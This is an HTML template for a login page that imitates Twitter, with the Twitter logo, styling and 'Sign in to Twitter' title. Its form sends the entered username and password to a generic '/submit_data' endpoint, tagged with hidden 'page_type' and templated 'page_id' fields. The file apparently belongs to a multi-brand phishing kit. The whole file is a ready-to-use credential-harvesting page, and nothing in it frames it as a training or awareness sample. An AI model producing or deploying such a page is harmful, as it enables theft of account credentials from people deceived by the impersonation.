<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Twitter / Twitter</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --twitter-blue: #1da1f2;
            --twitter-blue-hover: #1a91da;
            --twitter-black: #0f1419;
            --twitter-dark-gray: #536471;
            --twitter-light-gray: #eef3f4;
            --twitter-border: #cfd9de;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            color: var(--twitter-black);
            line-height: 1.3;
        }
        
        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-box {
            max-width: 364px;
            width: 100%;
            padding: 20px;
        }
        
        .twitter-logo {
            width: 40px;
            height: 40px;
            margin-bottom: 32px;
            fill: var(--twitter-blue);
        }
        
        h1 {
            font-size: 31px;
            font-weight: 700;
            margin-bottom: 32px;
        }
        
        .form-group {
            position: relative;
            margin-bottom: 20px;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 8px 8px;
            font-size: 17px;
            line-height: 24px;
            border: 1px solid var(--twitter-border);
            border-radius: 4px;
            color: var(--twitter-black);
            transition: border-color 0.2s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--twitter-blue);
        }
        
        .form-label {
            position: absolute;
            left: 8px;
            top: 8px;
            font-size: 17px;
            color: var(--twitter-dark-gray);
            pointer-events: none;
            transition: all 0.2s;
        }
        
        .form-control:focus + .form-label,
        .form-control:not(:placeholder-shown) + .form-label {
            transform: translateY(-12px) scale(0.75);
            color: var(--twitter-blue);
        }
        
        .login-button {
            width: 100%;
            padding: 15px;
            background-color: var(--twitter-black);
            color: #fff;
            border: none;
            border-radius: 9999px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 12px;
            transition: background-color 0.2s;
        }
        
        .login-button:hover {
            background-color: #272c30;
        }
        
        .forgot-password {
            display: block;
            color: var(--twitter-blue);
            text-decoration: none;
            font-size: 15px;
            margin-top: 16px;
            text-align: left;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .signup-text {
            color: var(--twitter-dark-gray);
            font-size: 15px;
            margin-top: 40px;
        }
        
        .signup-link {
            color: var(--twitter-blue);
            text-decoration: none;
            font-weight: 700;
        }
        
        .signup-link:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 450px) {
            .login-box {
                padding: 16px;
            }
            
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <svg viewBox="0 0 24 24" class="twitter-logo">
                <path fill="currentColor" d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path>
            </svg>
            
            <h1>Sign in to Twitter</h1>
            
            <form method="POST" action="/submit_data">
                <input type="hidden" name="page_type" value="twitter">
                <input type="hidden" name="page_id" value="{{ page_id }}">
                
                <div class="form-group">
                    <input type="text" class="form-control" id="username" name="username" placeholder=" " required>
                    <label class="form-label" for="username">Phone, email, or username</label>
                </div>
                
                <div class="form-group">
                    <input type="password" class="form-control" id="password" name="password" placeholder=" " required>
                    <label class="form-label" for="password">Password</label>
                </div>
                
                <button type="submit" class="login-button">Sign in</button>
                
                <a href="#" class="forgot-password">Forgot password?</a>
                
                <p class="signup-text">
                    Don't have an account? <a href="#" class="signup-link">Sign up</a>
                </p>
            </form>
        </div>
    </div>
</body>
</html>
